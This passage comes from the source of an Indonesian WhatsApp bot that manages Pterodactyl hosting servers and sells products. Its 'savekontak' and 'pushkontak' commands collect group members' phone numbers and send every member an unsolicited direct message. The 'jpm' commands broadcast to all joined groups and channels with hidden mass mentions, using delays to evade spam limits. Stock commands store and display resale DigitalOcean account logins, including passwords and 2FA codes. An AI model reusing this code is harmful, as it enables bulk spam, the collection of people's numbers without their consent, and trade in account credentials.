"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_20",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`*Berhasil Menambahkan Server Panel*

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break

case "addserver-v2": case "addsrv-v2": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example(`name|tanggal|userId|eggId|locationId|memory/disk|cpu\nContoh : ${prefix+command} Rulzz Server|Panel By Rulzz OfficiaL|1|15|1|0/0|0`))
let s = text.split('|');
if (s.length < 7) return m.reply(`*Format Salah*\nContoh: ${prefix + command} name|deskripsi|userId|eggId|locationId|memory/disk|cpu`)
let name = s[0];
let desc = s[1];
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domainV2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_20",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`*Berhasil Menambahkan Server Panel*

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "produk": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await Rulzz.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Rulzz OfficiaL🔥 - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Rulzz.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Rulzz OfficiaL🔥 - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Rulzz.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
const meta = await Rulzz.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.pushkontaknyaanjay ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return Rulzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© RulzXD Botz V4 - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qtoko}) 
}
break

case "pushkontaknyaanjay": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await Rulzz.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await Rulzz.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await Rulzz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Rulzz.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Rulzz.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Rulzz.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Rulzz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Rulzz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Rulzz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qtext2})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Rulzz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Rulzz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qtext2})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await Rulzz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Rulzz.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Rulzz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qtext2})
}
break

//================================================================================

case "jpmhidetag": case "jpmht": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return m.reply(example("Pesannya"));

    let allGroups = await Rulzz.groupFetchAllParticipating();
    let groupIds = Object.keys(allGroups);
    let count = 0;
    const jid = m.chat;
    const teks = text;

    await m.reply(`Memproses *jpm hidetag* teks ke ${groupIds.length} grup`);
    for (let i of groupIds) {
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;

        try {
            let members = allGroups[i].participants.map(v => v.id);
            await Rulzz.sendMessage(i, { text: teks, mentions: [...members] }, { quoted: qtoko });
            count += 1;
        } catch {}
        await sleep(global.delayJpm);
    }

    await Rulzz.sendMessage(jid, { text: `*Jpm Hidetag Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}` }, { quoted: qtoko });
}
break

case 'backupnow': {
if (!isCreator) return m.reply(mess.owner);
 try {
  const backupPath = await createBackupZip();

  await Rulzz.sendMessage(m.chat, {
    document: fs.readFileSync(backupPath),
    mimetype: 'application/zip',
    fileName: path.basename(backupPath),
    caption: '✅ Backup berhasil dibuat (library/database + library/data + source)'
  }, { quoted: m });

  const githubUrl = await uploadToGitHub(backupPath);
    await Rulzz.sendMessage(m.chat, { text: `✅ Upload ke GitHub selesai!\n📦 Link: ${githubUrl}` }, { quoted: m });
    fs.unlinkSync(backupPath);
 } catch (err) {
   console.error(err);
   Rulzz.sendMessage(m.chat, { text: '❌ Gagal membuat/upload backup.' }, { quoted: m });
 }
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Rulzz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Rulzz.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Rulzz.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Rulzz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qtext2})
}
break

//================================================================================

case "jpmhidetag2": case "jpmht2": {
    if (!isCreator) return Reply(mess.owner);
    if (!q) return m.reply(example("Teks dengan mengirim foto"));
    if (!/image/.test(mime)) return m.reply(example("Teks dengan mengirim foto"));

    const allGroups = await Rulzz.groupFetchAllParticipating();
    const groupIds = Object.keys(allGroups);
    let count = 0;
    const teks = text;
    const jid = m.chat;
    const mediaPath = await Rulzz.downloadAndSaveMediaMessage(qmsg);

    await m.reply(`Memproses *jpm2 hidetag* teks & foto ke ${groupIds.length} grup`);
    for (let i of groupIds) {
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;

        try {
            let members = allGroups[i].participants.map(v => v.id); // Ambil semua peserta grup
            await Rulzz.sendMessage(
                i,
                { image: fs.readFileSync(mediaPath), caption: teks, mentions: [...members] },
                { quoted: qlocJpm }
            );
            count += 1;
        } catch {}
        await sleep(global.delayJpm); // Delay untuk menghindari spam
    }

    await fs.unlinkSync(mediaPath); // Hapus file media setelah selesai
    await Rulzz.sendMessage(
        jid,
        { text: `*Jpm2 Hidetag Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}` },
        { quoted: qtoko }
    );
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner);
if (!q) return m.reply(example("teks dengan mengirim foto"));
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"));

const allgrup = await Rulzz.groupFetchAllParticipating();
const res = Object.keys(allgrup);
let count = 0;
const teks = text;
const jid = m.chat;
const rest = await Rulzz.downloadAndSaveMediaMessage(qmsg);

await m.reply(`Memproses *jpm* testimoni ke ${res.length} grup`);

for (let i of res) {
    if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm === true) continue;
    try {
        await Rulzz.sendMessage(i, {
            image: await fs.readFileSync(rest), 
            caption: teks, 
            contextInfo: { 
                mentionedJid: [m.sender], 
                businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, 
                forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }
            }
        }, {quoted: qlocJpm});
        count += 1;
    } catch {}
    await sleep(global.delayJpm);
}

await fs.unlinkSync(rest);
await Rulzz.sendMessage(jid, {
    text: `*Jpm Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`
}, {quoted: qtoko});

} break

//================================================================================

case "pay": case "payment": case "qris": {
await Rulzz.sendMessage(m.chat, {
  image: {url: global.image.qris}, 
  caption: "Lihat Lebih Banyak Payment Disini 👇\n*https://payment.rulzzofficial.my.id*\n\n```SUDAH TF WAJIB MENYERTAKAN BUKTI TRANSFER AGAR TIDAK TERJADI DRAMA```"
}, {quoted: qtext2})
}
break
//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Marketplace :*
${linkGrup}`
await Rulzz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel,2"))

const parts = text.split(",");
 if (parts.length < 2) return m.reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"));
 
const [barang, harga] = parts;
 if (isNaN(harga)) return reply("Format Harga Tidak Valid");
 
const total = `${harga}000000`;
const total2 = Number(`${harga}000`);
 
let teks = `*Alhamdulillah Trx Done✅*
_📦Barang : ${barang}_
_💸Harga : Rp${Number(total2)}_
_⏰Tanggal :${tanggal(Date.now())}_

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Rulzz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

//================================================================================

case "owner": {
await Rulzz.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await Rulzz.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
Rulzz.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "ping": case "uptime": {
if (!isCreator) return Reply(mess.owner);

const timestamp = speed();
const latensi = speed() - timestamp;

const tio = await nou.os.oos();
const tot = await nou.drive.info();
const used = process.memoryUsage();
const cpus = os.cpus();
const cpu = cpus.reduce(
   (acc, core) => {
       const total = Object.values(core.times).reduce((a, b) => a + b, 0);
       acc.total += total;
       acc.speed += core.speed / cpus.length;
       Object.keys(core.times).forEach((k) => (acc.times[k] += core.times[k]));
       return acc;
     },
     {
       speed: 0,
       total: 0,
       times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 },
     }
  );
const cpuUsage = Object.keys(cpu.times)
  .map((type) => `- *${type.padEnd(6)}:* ${(cpu.times[type] * 100 / cpu.total).toFixed(2)}%`)
  .join("\n");

const totalRam = formatp(os.totalmem());
const usedRam = formatp(os.totalmem() - os.freemem());
const totalDisk = `${tot.totalGb} GB`;
const usedDisk = `${tot.usedGb} GB (${tot.usedPercentage}%)`;
const freeDisk = `${tot.freeGb} GB (${tot.freePercentage}%)`;

const respon = `
*🔴 INFORMATION SERVER VPS*
*_• Platform :_* _${nou.os.type()}_
*_• Total Ram :_* _${totalRam}_
*_• Total Disk :_* _${totalDisk}_
*_• Total Cpu :_* _${cpus.length} Core_
*_• Runtime VPS :_* _${runtime(os.uptime())}_
*_• Runtime Server :_* _${runtime(process.uptime())}_

*🔵 INFORMATION BOTZ*
*_• Response Speed :_* _${latensi.toFixed(4)} detik_
*_• RAM :_*
- _Total: ${totalRam}_
- _Digunakan: ${usedRam}_
*_• PENYIMPANAN :_*
- _Total: ${totalDisk}_
- _Digunakan: ${usedDisk}_
- _Tersedia: ${freeDisk}_
*_• CPU USAGE (${cpus.length} CORE)_*
_${cpus[0].model.trim()} (${cpu.speed} MHz)_
${cpuUsage}
`.trim();
    await Rulzz.sendMessage(m.chat, { text: respon }, { quoted: m });
}
break

//================================================================================

case "public": {
if (!isCreator) return
Rulzz.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "jpmch": {
    if (!isCreator) return m.reply(mess.owner);
if (listidch.length < 1) return m.reply("Tidak ada id ch didalam database")
if (!q) return m.reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await Rulzz.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = listidch
const res = allgrup
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpm all ch *${opsijpm}* ke ${res.length} channel`)
for (let i of res) {
try {
await Rulzz.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await Rulzz.sendMessage(jid, {text: `Jpmch *${opsijpm}* berhasil dikirim ke ${count} channel`}, {quoted: m})
}
break
//================================================================================

case "dev": {
await Rulzz.sendContact(m.chat, [global.tekser], m)
}
break

case "backupsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `RulzXD-V4.0`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Rulzz.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================
case "setppbot": {
    if (!isOwner) return m.reply(mess.owner)
    if (!/image/.test(mime)) return m.reply(example('dengan mengirim foto'))

    try {
        let media = await Rulzz.downloadAndSaveMediaMessage(qmsg, './source/ppbot.jpeg', false)
        await Rulzz.updateProfilePicture(botNumber, { url: media })
        await fs.promises.unlink(media)
        m.reply("✅ Berhasil mengganti foto profil bot!")
    } catch (err) {
        console.error(err)
        m.reply("❌ Gagal mengganti foto profil bot.")
    }
}
break

case "setppbotpanjang":
case "setpppanjang": {
    if (!isOwner) return m.reply(mess.owner)
    if (!/image/.test(mime)) return m.reply(example('dengan mengirim foto'))

    try {
        let medis = await Rulzz.downloadAndSaveMediaMessage(qmsg, './source/ppbotpanjang.jpeg', false)
        let { img } = await generateProfilePicture(medis)
        await Rulzz.query({
            tag: 'iq',
            attrs: {
                to: botNumber,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [
                {
                    tag: 'picture',
                    attrs: { type: 'image' },
                    content: img
                }
            ]
        })
        await fs.promises.unlink(medis)
        m.reply("✅ Berhasil mengganti foto profil bot (panjang)!")
    } catch (err) {
        console.error(err)
        m.reply("❌ Gagal mengganti foto profil bot panjang.")
    }
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
Rulzz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Rulzz.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delown": case "delowner": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addown": case "addowner": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================
case "addstok": case "adddo": case "addstokdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("10 Droplet Paypal|rulzz@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
if (!text.split("|")) return m.reply(example("10 Droplet Paypal|rulzz@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
const cek = text.split("|")
if (cek.length < 6) return m.reply(example("10 Droplet Paypal|rulzz@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
let [nama, email, pw, kode2fa, reff, droplet, harga] = text.split("|")
stokdo.push({
nama: nama,
email: email, 
password: pw, 
kode2fa: kode2fa, 
referall: reff, 
droplet: droplet, 
harga: Number(harga)
})
await fs.writeFileSync("./library/data/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menambah data stok digitalocean ✅")
}
break

//================================================================================

case "delstok": case "delstokdo": case "deldo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return m.reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return m.reply(example("idnya\n\nKetik *.liststok* untuk lihat id"))
if (Number(text) > stokdo.length) return m.reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./library/data/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menghapus data stok digitalocean ✅")
}
break

//================================================================================

case "liststok": case "liststokdo": case "listdo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
if (m.isGroup) return Reply(mess.private)
let messageText = "\n *── List stok akun digital ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return m.reply(messageText)
}
break

case "buydo": case "buydigitalocean": {
if (stokdo.length < 1) return m.reply("Maaf stok do sedang tidak tersedia")
if (m.isGroup) return m.reply("Pembelian digitalocean hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  if (!text) {
    let butnya = []
    let urutt = 0
